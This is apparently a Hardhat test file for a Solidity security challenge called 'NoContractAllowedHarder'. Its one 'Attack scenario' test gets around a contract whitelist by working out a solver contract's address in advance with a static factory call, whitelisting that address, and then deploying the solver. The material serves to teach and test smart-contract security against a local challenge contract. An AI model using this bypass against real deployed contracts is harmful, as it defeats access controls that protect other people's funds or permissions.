const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("NoContractAllowedHarder", function () {
  
  async function deploy() {
    /// Get accounts
    let [deployer] = await ethers.getSigners();

    /// Deploy testing contracts
    const NoContractAllowedHarder = await ethers.getContractFactory("NoContractAllowedHarder");
    const noContractAllowedHarder = await NoContractAllowedHarder.connect(deployer).deploy();

    return { noContractAllowedHarder, deployer };
  }

  describe("Attack scenario", () => {
    it("Bypass requesting whitelist by precalculating the solver address", async () => {
      const { noContractAllowedHarder, deployer } = await deploy();
      
      const SolverFactoryContract = await ethers.getContractFactory("SimpleSolverFactory");
      const NoContractAllowedHarderSolverContract = await ethers.getContractFactory("NoContractAllowedHarderSolver");
      /// Deploy solver fzctory contract 
      const factory = await SolverFactoryContract.connect(deployer).deploy();
      const target = noContractAllowedHarder.address;
      /// Do static call to retrive solver address
      const nextSolverAddress = await factory.callStatic.createSolver(target);
      /// Request whitelist for solver
      await noContractAllowedHarder.connect(deployer).requestWhitelistForSomeone(nextSolverAddress);
      /// Create the next solver 
      await factory.connect(deployer).createSolver(target);
      const solverAddress = await factory.solverAddress();
      expect(solverAddress).equal(nextSolverAddress);
      /// Check whitelist
      const solver = await ethers.getContractAt("NoContractAllowedHarderSolver", solverAddress);
      expect(await noContractAllowedHarder.whitelist(solver.address)).to.be.true;
    });
  });

});